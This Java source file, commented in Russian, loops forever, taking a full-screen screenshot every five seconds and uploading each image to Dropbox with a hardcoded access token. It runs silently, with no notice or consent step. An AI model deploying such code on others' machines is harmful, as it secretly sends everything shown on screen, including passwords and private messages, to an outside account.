package com.company;

import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;

import static java.lang.Thread.sleep;

public class Main {

    public static void main(String[] args) throws InterruptedException, IOException, DbxException, AWTException {

        for (int i = 0; i > -1; i++) {
            String ACCESS_TOKEN = "***";//токен
            DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();//подключение к drop
            DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);//создание клюента для отправки файлов
            SimpleDateFormat formatter = new SimpleDateFormat("ddMMyyyy_Hms");//текущее время и дата
            Date now = new Date();//дата
            BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));//сделать скрин и запихать в буфер

            ByteArrayOutputStream os = new ByteArrayOutputStream();//обьект -скриншот
            ImageIO.write(image, "png", os);//записаь
            InputStream is = new ByteArrayInputStream(os.toByteArray());//отправка скрина


            client.files().uploadBuilder("/" + formatter.format(now) + ".png").uploadAndFinish(is);//задаем имя
            sleep(5000);//сделать паузу 5 секунд
        }


    }


}

